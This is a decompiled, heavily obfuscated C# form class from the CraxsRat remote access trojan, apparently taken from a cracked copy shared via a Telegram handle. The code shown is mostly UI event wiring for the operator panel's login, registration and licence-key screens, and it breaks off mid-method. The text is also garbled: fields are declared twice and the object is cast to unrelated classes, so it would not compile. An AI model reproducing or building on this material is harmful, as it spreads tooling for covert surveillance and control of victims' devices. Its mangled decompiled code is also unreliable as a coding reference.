// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Ports
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Ports : Form
  {
    public string Title;
    public bool IsActive;
    public string tmpFolderUSER;
    public string tmpClientName;
    public string tmpCountry;
    public string tmpAddressIP;
    private System.Collections.Generic.List<DataGridViewRow> searchbefore;
    private int lastFoundIndex;
    public static readonly Keylogger._Closure\u0024__ \u0024I;
    public static WaitCallback \u0024IR158\u002D1;
    public static WaitCallback \u0024IR159\u002D2;
    private IContainer components;
    public string[] infoMaps;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Link;
    public string Key;
    public double Latitude;
    public double Longitude;
    public Size ImageSize;
    public int Zoom;
    public string Markers;
    public System.Collections.Generic.List<Array> List;
    public Thread Threadingg;
    public string style;
    public string Title;
    public string Accuracy;
    public string Speed;
    private bool MouseState;
    public bool Issilent;
    public string tmpFolderUSER;
    private bool boSave;
    private IContainer components;

    internal virtual Panel pnl1
    {
      get => ((Report) this)._pnl1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.pnl1_Paint);
label_1:
        int num1 = 1447202558;
        Panel pnl1;
        MouseEventHandler mouseEventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 + -(-793065573 * (~1500819854 + --1846349006) * -217284717) - 263923171 * (-(668892740 ^ 1287787232) ^ -367981569 * -583214952 - (-447280540 - 757175635)) + ~((2059011483 + 41542171) * 796105067) - (-592759888 * 1694340597 ^ 1388417220 - -952854288) + 889202998 * 972159253 ^ -290433084)) % 10U)
          {
            case 0:
              goto label_1;
            case 1:
              pnl1 = ((Report) this)._pnl1;
              num1 = (int) num2 * 1541867202 ^ -971533276;
              continue;
            case 2:
              goto label_3;
            case 3:
              pnl1.Paint -= paintEventHandler;
              num1 = (int) num2 * -452821882 ^ 1861677332;
              continue;
            case 4:
              int num3 = pnl1 == null ? 495936257 : (num3 = -649415946);
              num1 = num3 ^ (int) num2 * -1000725411;
              continue;
            case 5:
              pnl1.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * -1809203081 ^ 1297144318;
              continue;
            case 6:
              pnl1.Paint += paintEventHandler;
              pnl1.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -110361746 ^ -1175157797;
              continue;
            case 7:
              mouseEventHandler = new MouseEventHandler(this.Pnl1_MouseDown);
              pnl1 = ((Report) this)._pnl1;
              num1 = (int) num2 * 1339653881 ^ -1765632216;
              continue;
            case 8:
              ((Report) this)._pnl1 = value;
              num1 = -1398495006;
              continue;
            case 9:
              int num4 = pnl1 == null ? -479549942 : (num4 = -1355381048);
              num1 = num4 ^ (int) num2 * -132060055;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual NotifyIcon notpass
    {
      get => ((Report) this)._notpass;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Report) this)._notpass = value;
    }

    internal virtual PictureBox PictureBox2
    {
      get => ((Report) this)._PictureBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.PictureBox2_MouseDown);
label_1:
        int num1 = 1849856631;
        PictureBox pictureBox2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --(((num1 ^ (5327337 ^ ~-1542027546) * -823254929 + (1274669775 * (1828581896 - 113384182) + (-1906097862 - 1077341721 - (987579279 + 507645154))) - ~(~1524014700 + --307410356 - (1208666081 - 842042015 - ~2098099358))) - (-(1840127679 ^ -613403521) - ---1247559845 - 953966505) - (-532227187 ^ -1082061918 ^ 457089927 ^ -336089519) * 1224391049) * -1040528267)) % 8U)
          {
            case 0:
              pictureBox2.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * 2081758615 ^ 533513731;
              continue;
            case 1:
              pictureBox2 = ((Report) this)._PictureBox2;
              num1 = (int) num2 * 386029796 ^ -1123831358;
              continue;
            case 2:
              pictureBox2.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -1538419529 ^ 1303350343;
              continue;
            case 3:
              goto label_3;
            case 4:
              pictureBox2 = ((Report) this)._PictureBox2;
              int num3 = pictureBox2 == null ? -1378313263 : (num3 = -1640739782);
              num1 = num3 ^ (int) num2 * 1024674154;
              continue;
            case 5:
              ((Report) this)._PictureBox2 = value;
              num1 = 1527929156;
              continue;
            case 6:
              int num4 = pictureBox2 == null ? 1331884009 : (num4 = 899449666);
              num1 = num4 ^ (int) num2 * -2021442385;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label3
    {
      get => ((Report) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Report) this)._Label3 = value;
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((Report) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Report) this)._DrakeUIToolTip1 = value;
    }

    internal virtual ToolTip ToolTip1
    {
      get => ((Report) this)._ToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Report) this)._ToolTip1 = value;
    }

    internal virtual DrakeUILinkLabel policylink
    {
      get => ((Report) this)._policylink;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUILinkLabel1_Click);
        DrakeUILinkLabel policylink = ((Report) this)._policylink;
        if (policylink == null)
          goto label_7;
label_1:
        int num1 = 1829034242;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-489608783 * -204983491 - ((--num2 ^ --(920440442 - -547849910)) - 284176519) + 404451065)) % 6U)
          {
            case 0:
              policylink.Click += eventHandler;
              num1 = (int) num3 * 1249895146 ^ -1578428905;
              continue;
            case 1:
              int num4 = policylink == null ? -1152726958 : (num4 = 1574711584);
              num1 = num4 ^ (int) num3 * -856134879;
              continue;
            case 2:
              goto label_3;
            case 3:
              policylink.Click -= eventHandler;
              num1 = (int) num3 * 1270348043 ^ -568717807;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((Report) this)._policylink = value;
        policylink = ((Report) this)._policylink;
        num1 = 1987211464;
        goto label_2;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => ((Report) this)._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        System.Windows.Forms.Timer timer1 = ((Report) this)._Timer1;
        if (timer1 == null)
          goto label_7;
label_1:
        int num1 = -975313215;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-(~(388907588 - ~1171066204 - -794754317 * (-1402575797 * 766975637)) - (num2 - (---(768407982 - 379101015) - ~(2074005426 - 1514761784 ^ -317634187 - -5051123) * 555208369))) ^ (1261070820 ^ -2025336218) - (-167766018 ^ 2110378973)) * 13642557 + 505813830)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              timer1.Tick += eventHandler;
              num1 = (int) num3 * -1454298614 ^ 935523314;
              continue;
            case 2:
              goto label_7;
            case 3:
              timer1.Tick -= eventHandler;
              num1 = (int) num3 * 512614547 ^ -78285089;
              continue;
            case 4:
              timer1 = ((Report) this)._Timer1;
              int num4 = timer1 == null ? -1376197386 : (num4 = 1857089519);
              num1 = num4 ^ (int) num3 * -1853471399;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((Report) this)._Timer1 = value;
        num1 = 2043541898;
        goto label_2;
      }
    }

    internal virtual Label statuslabel
    {
      get => ((Report) this)._statuslabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Statuslabel_Click);
        Label statuslabel = ((Report) this)._statuslabel;
label_1:
        int num1 = -471854642;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 - ((-649028776 - -410782053 + -2064218491 * 1571464684) * -1769164489 - (465040120 ^ -397291512 ^ -1598551853 - 1347882764) + (-99529371 - (-2087837468 ^ -799028966 - 1740434636)))) - -1729080803 ^ ~-729285556 - 572773545 ^ -1532444437 ^ -1928676900) * 160982557)) % 7U)
          {
            case 0:
              statuslabel.Click -= eventHandler;
              num1 = (int) num2 * 536895905 ^ 750987764;
              continue;
            case 1:
              int num3 = statuslabel == null ? 323888101 : (num3 = -2083881752);
              num1 = num3 ^ (int) num2 * -424607735;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num4 = statuslabel == null ? 1584348473 : (num4 = 1213774677);
              num1 = num4 ^ (int) num2 * 903377098;
              continue;
            case 4:
              goto label_3;
            case 5:
              statuslabel.Click += eventHandler;
              num1 = (int) num2 * 155569939 ^ 81791389;
              continue;
            case 6:
              ((Report) this)._statuslabel = value;
              statuslabel = ((Report) this)._statuslabel;
              num1 = -1143797744;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label qutelabel
    {
      get => ((Report) this)._qutelabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Label1_MouseDown);
        Label qutelabel = ((Report) this)._qutelabel;
label_1:
        int num1 = 242134917;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(((-num1 ^ 1700274403 * (~(1065850581 * -1785458447) - -~134189748)) * -466857745 ^ -855014463) - (660440819 + 514807513))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              ((Report) this)._qutelabel = value;
              qutelabel = ((Report) this)._qutelabel;
              num1 = -1584322009;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num3 = qutelabel == null ? -1687439035 : (num3 = -685187618);
              num1 = num3 ^ (int) num2 * -143654916;
              continue;
            case 4:
              int num4 = qutelabel == null ? 104978801 : (num4 = -1627228730);
              num1 = num4 ^ (int) num2 * -556499062;
              continue;
            case 5:
              qutelabel.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * 1209019526 ^ -333903861;
              continue;
            case 6:
              qutelabel.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -1063098683 ^ 652736260;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label Label13
    {
      get => ((Report) this)._Label13;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Report) this)._Label13 = value;
    }

    internal virtual Label welclabel
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._welclabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.welclabel_Click);
label_1:
        int num1 = -1729643655;
        Label welclabel;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 - ((-(-1533120825 * 646137170 ^ -1487684791) ^ -727563839 * (~-937325408 - -630159731)) + ((1685808355 - -255929996) * 1065600877 - -1885310801 * ~628063089 ^ 590479658 + (1937650151 * 1445457629 + ~1296242061)))) * -1225537289 - (-862002911 - 1035112677 - -147742829 * 178782347 - ~(1310498551 - 189676578)) ^ --1511754526 ^ -1758928028 ^ -458382503) * 225943473 * -286254749)) % 7U)
          {
            case 0:
              welclabel = ((Report.VB\u0024StateMachine_17_FadeIn) this)._welclabel;
              int num3 = welclabel == null ? 1082902596 : (num3 = 142932659);
              num1 = num3 ^ (int) num2 * 1269690753;
              continue;
            case 1:
              goto label_3;
            case 2:
              welclabel.Click += eventHandler;
              num1 = (int) num2 * -335147643 ^ 752628746;
              continue;
            case 3:
              welclabel.Click -= eventHandler;
              num1 = (int) num2 * 572625240 ^ 1793020428;
              continue;
            case 4:
              ((Report.VB\u0024StateMachine_17_FadeIn) this)._welclabel = value;
              num1 = -52021809;
              continue;
            case 5:
              goto label_1;
            case 6:
              welclabel = ((Report.VB\u0024StateMachine_17_FadeIn) this)._welclabel;
              int num4 = welclabel == null ? 102358292 : (num4 = 761071897);
              num1 = num4 ^ (int) num2 * -1760076526;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel pnl0
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._pnl0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_17_FadeIn) this)._pnl0 = value;
      }
    }

    internal virtual DrakeUIButtonIcon exitbtn
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._exitbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click_1);
        DrakeUIButtonIcon exitbtn = ((Report.VB\u0024StateMachine_17_FadeIn) this)._exitbtn;
        if (exitbtn == null)
          goto label_7;
label_1:
        int num1 = 264693642;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 ^ ~-796737457 - --235141200 - 991375726 - 2042222950 * 647748813 ^ 516421643 - (-427321127 ^ 541616941) + -(-1327404650 ^ 1529072549) ^ -~-198859837 ^ ((-1312370919 - 481570845 ^ -1090362249 - 1523845907) + --481870822) * 257434617) - -(1752270441 + (-365536552 - -1183452612)) ^ --260147471) * 628779345 ^ -1523720327)) % 7U)
          {
            case 0:
              int num3 = exitbtn == null ? -1902385833 : (num3 = 1841263940);
              num1 = num3 ^ (int) num2 * 1131509844;
              continue;
            case 1:
              goto label_7;
            case 2:
              exitbtn = ((Report.VB\u0024StateMachine_17_FadeIn) this)._exitbtn;
              num1 = (int) num2 * 751012946 ^ 1660386040;
              continue;
            case 3:
              exitbtn.Click += eventHandler;
              num1 = (int) num2 * 796018596 ^ 1426373791;
              continue;
            case 4:
              goto label_3;
            case 5:
              exitbtn.Click -= eventHandler;
              num1 = (int) num2 * -269228246 ^ 1723324636;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_7:
        ((Report.VB\u0024StateMachine_17_FadeIn) this)._exitbtn = value;
        num1 = 392281978;
        goto label_2;
      }
    }

    internal virtual DrakeUILinkLabel DrakeUILinkLabel1
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._DrakeUILinkLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUILinkLabel1_Click_2);
label_1:
        int num1 = 374230340;
        DrakeUILinkLabel drakeUiLinkLabel1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~-(num1 * -246945787) * 917019471 - -2032318595)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Report.VB\u0024StateMachine_17_FadeIn) this)._DrakeUILinkLabel1 = value;
              num1 = -197043381;
              continue;
            case 2:
              drakeUiLinkLabel1.Click -= eventHandler;
              num1 = (int) num2 * -1707494142 ^ -135026629;
              continue;
            case 3:
              drakeUiLinkLabel1 = ((Report.VB\u0024StateMachine_17_FadeIn) this)._DrakeUILinkLabel1;
              int num3 = drakeUiLinkLabel1 == null ? -557690781 : (num3 = -1057475824);
              num1 = num3 ^ (int) num2 * -1597784641;
              continue;
            case 4:
              drakeUiLinkLabel1.Click += eventHandler;
              num1 = (int) num2 * 263611000 ^ 532243949;
              continue;
            case 5:
              drakeUiLinkLabel1 = ((Report.VB\u0024StateMachine_17_FadeIn) this)._DrakeUILinkLabel1;
              int num4 = drakeUiLinkLabel1 == null ? -1189335242 : (num4 = 1304550489);
              num1 = num4 ^ (int) num2 * -1371091415;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.PictureBox1_MouseDown_1);
label_1:
        int num1 = 1027721819;
        PictureBox pictureBox1;
        EventHandler eventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(((num1 + ((580757073 * -1002674171 ^ ~(445289766 - 35550868)) - 552661381) * 1309062381) * 1636275493 ^ (-844962368 - -131069925 * 1528836811) * -934081959) - (~2040432017 - (1254505199 - 418203505)))) % 8U)
          {
            case 0:
              pictureBox1 = ((Report.VB\u0024StateMachine_17_FadeIn) this)._PictureBox1;
              int num3 = pictureBox1 == null ? -278723528 : (num3 = -753823815);
              num1 = num3 ^ (int) num2 * 898098685;
              continue;
            case 1:
              pictureBox1.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * 2144449374 ^ 2135253195;
              continue;
            case 2:
              goto label_3;
            case 3:
              eventHandler = new EventHandler(this.PictureBox1_Click);
              num1 = (int) num2 * 2046457569 ^ -124230601;
              continue;
            case 4:
              ((Report.VB\u0024StateMachine_17_FadeIn) this)._PictureBox1 = value;
              pictureBox1 = ((Report.VB\u0024StateMachine_17_FadeIn) this)._PictureBox1;
              int num4;
              num1 = num4 = pictureBox1 == null ? 1603622566 : (num4 = -683483441);
              continue;
            case 5:
              pictureBox1.Click -= eventHandler;
              num1 = (int) num2 * -1963454316 ^ 1376129164;
              continue;
            case 6:
              goto label_1;
            case 7:
              pictureBox1.MouseDown += mouseEventHandler;
              pictureBox1.Click += eventHandler;
              num1 = (int) num2 * -725816002 ^ -1631797372;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_17_FadeIn) this)._Panel1 = value;
      }
    }

    internal virtual BackgroundWorker loginworker
    {
      get => ((Report.VB\u0024StateMachine_17_FadeIn) this)._loginworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        RunWorkerCompletedEventHandler completedEventHandler = new RunWorkerCompletedEventHandler(this.loginworker_RunWorkerCompleted);
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.Loginworker_DoWork);
label_1:
        int num1 = 990750124;
        while (true)
        {
          int num2 = num1;
          uint num3;
          BackgroundWorker loginworker;
          switch ((num3 = (uint) (-(~(~(1946430643 * -~310196811) + (1748035295 + -~-1262245064) - num2) * -2073121151) - (-1557965617 - 2006833759) ^ -1280298203)) % 10U)
          {
            case 0:
              goto label_3;
            case 1:
              ((Report.VB\u0024StateMachine_17_FadeIn) this)._loginworker = value;
              num1 = -924908484;
              continue;
            case 2:
              int num4 = loginworker == null ? 129239855 : (num4 = -574565561);
              num1 = num4 ^ (int) num3 * 705409676;
              continue;
            case 3:
              loginworker.DoWork += workEventHandler;
              num1 = (int) num3 * -370719709 ^ -1122897022;
              continue;
            case 4:
              loginworker.RunWorkerCompleted += completedEventHandler;
              num1 = (int) num3 * -1695502185 ^ 104004386;
              continue;
            case 5:
              loginworker = ((Report.VB\u0024StateMachine_17_FadeIn) this)._loginworker;
              num1 = (int) num3 * -2131204902 ^ -1614115517;
              continue;
            case 6:
              int num5 = loginworker == null ? 1679974060 : (num5 = 54647367);
              num1 = num5 ^ (int) num3 * 2061966729;
              continue;
            case 7:
              loginworker = ((Report.VB\u0024StateMachine_17_FadeIn) this)._loginworker;
              num1 = (int) num3 * 663557411 ^ -1561961914;
              continue;
            case 8:
              loginworker.RunWorkerCompleted -= completedEventHandler;
              loginworker.DoWork -= workEventHandler;
              num1 = (int) num3 * -1646300889 ^ 1036740384;
              continue;
            case 9:
              goto label_1;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual BackgroundWorker regworker
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._regworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        RunWorkerCompletedEventHandler completedEventHandler = new RunWorkerCompletedEventHandler(this.regworker_RunWorkerCompleted);
label_1:
        int num1 = -283394512;
        BackgroundWorker regworker;
        DoWorkEventHandler workEventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-~~num1 * 515916343 ^ -1117449021 ^ -1424737513) + 919141906)) % 11U)
          {
            case 0:
              regworker.RunWorkerCompleted -= completedEventHandler;
              num1 = (int) num2 * 1728313333 ^ -1888265779;
              continue;
            case 1:
              regworker = ((Report.VB\u0024StateMachine_18_FadeOut) this)._regworker;
              num1 = (int) num2 * 1725344731 ^ 2031804855;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num3 = regworker == null ? 807352734 : (num3 = 1522242586);
              num1 = num3 ^ (int) num2 * -843416017;
              continue;
            case 4:
              regworker.DoWork -= workEventHandler;
              num1 = (int) num2 * -981930865 ^ 569721977;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((Report.VB\u0024StateMachine_18_FadeOut) this)._regworker = value;
              num1 = -718980814;
              continue;
            case 7:
              regworker.DoWork += workEventHandler;
              num1 = (int) num2 * 609860631 ^ -2038011988;
              continue;
            case 8:
              workEventHandler = new DoWorkEventHandler(this.Regworker_DoWork);
              regworker = ((Report.VB\u0024StateMachine_18_FadeOut) this)._regworker;
              num1 = (int) num2 * -1020738180 ^ 1179044119;
              continue;
            case 9:
              regworker.RunWorkerCompleted += completedEventHandler;
              num1 = (int) num2 * 640382163 ^ 1768082524;
              continue;
            case 10:
              int num4 = regworker == null ? 3785604 : (num4 = 479034352);
              num1 = num4 ^ (int) num2 * -1803042493;
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
    }

    internal virtual DrakeUITabControl DrakeUITabControl1
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._DrakeUITabControl1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_18_FadeOut) this)._DrakeUITabControl1 = value;
      }
    }

    internal virtual TabPage TabPage2
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._TabPage2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_18_FadeOut) this)._TabPage2 = value;
      }
    }

    internal virtual TabPage TabPage1
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._TabPage1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_18_FadeOut) this)._TabPage1 = value;
      }
    }

    internal virtual DrakeUILoadingBar loadingimage
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._loadingimage;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_18_FadeOut) this)._loadingimage = value;
      }
    }

    internal virtual DrakeUICheckBox savekey
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._savekey;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_18_FadeOut) this)._savekey = value;
      }
    }

    internal virtual DrakeUIButtonIcon loginbtn
    {
      get => ((Report.VB\u0024StateMachine_18_FadeOut) this)._loginbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_ok_Click);
label_1:
        int num1 = 127018255;
        DrakeUIButtonIcon loginbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 + (435409987 * (~-1858197730 ^ 1328109093 - -1085823897) - 517761743) ^ 1768107231 * (1555326877 - 2122494586) ^ --1832178369 ^ -1874763559) - ~(-1509469562 ^ 1007039740))) % 9U)
          {
            case 0:
              loginbtn.Click -= eventHandler;
              num1 = (int) num2 * -1012985730 ^ 1187664402;
              continue;
            case 1:
              goto label_3;
            case 2:
              ((Report.VB\u0024StateMachine_18_FadeOut) this)._loginbtn = value;
              num1 = -1110916536;
              continue;
            case 3:
              goto label_1;
            case 4:
              loginbtn = ((Report.VB\u0024StateMachine_18_FadeOut) this)._loginbtn;
              num1 = (int) num2 * 1093476783 ^ 1944545139;
              continue;
            case 5:
              int num3 = loginbtn == null ? -1918940358 : (num3 = -316688017);
              num1 = num3 ^ (int) num2 * -765886978;
              continue;
            case 6:
              loginbtn = ((Report.VB\u0024StateMachine_18_FadeOut) this)._loginbtn;
              num1 = (int) num2 * -673041884 ^ -1044726146;
              continue;
            case 7:
              int num4 = loginbtn == null ? -747252676 : (num4 = 534638798);
              num1 = num4 ^ (int) num2 * 443782014;
              continue;
            case 8:
              loginbtn.Click += eventHandler;
              num1 = (int) num2 * 1425776865 ^ -1035569680;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUITextBox usrkeytext
    {
      get => ((Report._Closure\u0024__19\u002D0) this)._usrkeytext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report._Closure\u0024__19\u002D0) this)._usrkeytext = value;
      }
    }

    internal virtual DrakeUITextBox usremailtext
    {
      get => ((Report._Closure\u0024__19\u002D0) this)._usremailtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report._Closure\u0024__19\u002D0) this)._usremailtext = value;
      }
    }

    internal virtual Label loginlabel
    {
      get => ((Report._Closure\u0024__19\u002D0) this)._loginlabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report._Closure\u0024__19\u002D0) this)._loginlabel = value;
      }
    }

    internal virtual DrakeUILoadingBar DrakeUILoadingBar1
    {
      get => ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._DrakeUILoadingBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._DrakeUILoadingBar1 = value;
      }
    }

    internal virtual DrakeUIButtonIcon regbtn
    {
      get => ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._regbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_reg_Click);
        DrakeUIButtonIcon regbtn = ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._regbtn;
label_1:
        int num1 = -259998615;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(-(655895214 ^ 1281903180) - (~num2 ^ (495915645 * (396484954 ^ 1106272462) ^ -103942141 - (207083308 - 1658040041)) - (-1291198642 - ~(1286302962 ^ -1455312152))) * 646667515 + (638804509 - 141656855))) % 7U)
          {
            case 0:
              int num4 = regbtn == null ? -2133048416 : (num4 = 1705646126);
              num1 = num4 ^ (int) num3 * -581291029;
              continue;
            case 1:
              int num5 = regbtn == null ? -249920557 : (num5 = -610935637);
              num1 = num5 ^ (int) num3 * 898662528;
              continue;
            case 2:
              goto label_1;
            case 3:
              regbtn.Click -= eventHandler;
              num1 = (int) num3 * 886483085 ^ -1968484786;
              continue;
            case 4:
              goto label_3;
            case 5:
              regbtn.Click += eventHandler;
              num1 = (int) num3 * -531603687 ^ 546425084;
              continue;
            case 6:
              ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._regbtn = value;
              regbtn = ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._regbtn;
              num1 = -1563003563;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUITextBox usrkeyreg
    {
      get => ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._usrkeyreg;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._usrkeyreg = value;
      }
    }

    internal virtual DrakeUITextBox usremailtextreg
    {
      get => ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._usremailtextreg;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._usremailtextreg = value;
      }
    }

    internal virtual Label Label1
    {
      get => ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._Label1 = value;
      }
    }

    internal virtual DrakeUITextBox keyText
    {
      get => ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._keyText;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Report.VB\u0024StateMachine_25_Report_MouseClick) this)._keyText = value;
      }
    }

    internal virtual TabPage TabPage3
    {
      get => ((NativeMethods) this)._TabPage3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((NativeMethods) this)._TabPage3 = value;
    }

    internal virtual DrakeUIButtonIcon CHIDbtn
    {
      get => ((NativeMethods) this)._CHIDbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CHIDbtn_Click);
        DrakeUIButtonIcon chiDbtn = ((NativeMethods) this)._CHIDbtn;
        if (chiDbtn == null)
          goto label_6;
label_1:
        int num1 = 2015174435;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
